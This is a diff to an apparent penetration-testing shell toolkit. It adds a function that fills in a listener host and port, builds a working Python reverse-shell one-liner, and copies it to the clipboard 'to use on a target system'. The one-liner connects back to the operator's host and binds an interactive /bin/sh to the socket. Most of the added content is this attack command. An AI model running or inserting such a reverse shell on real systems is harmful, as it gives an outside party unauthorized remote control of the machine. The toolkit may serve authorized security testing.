@@ -15,6 +15,7 @@ Commands
 nb-shell-tty-full        commands to spawn a fully interactive tty shell with python
 nb-shell-tty-python2     command to spawn a tty shell
 nb-shell-tty-python3     command to spawn a tty shell
+nb-shell-tty-python-nc   command to spawn a new netcat shell with python
 nb-shell-tty-sh          command to spawn a tty shell
 nb-shell-tty-perl        command to spawn a tty shell
 nb-shell-tty-ruby        command to spawn a tty shell
@@ -25,6 +26,16 @@ nb-shell-tty-find-exec   command to spawn a tty shell
 nb-shell-tty-expect      command to spawn a tty shell
 
 DOC
+}
+
+nb-shell-tty-python-nc() {
+    nb-vars-set-lhost
+    nb-vars-set-lport
+
+    __ok "Command to use on a target system copied to clipboard"
+    __COMMAND="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${__LHOST}",${__LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"}
+    echo "$__COMMAND" | wl-copy
+    echo "$__COMMAND" | bat --file-name "nb-shell-tty-python-nc"
 }
 
 nb-shell-tty-full() {
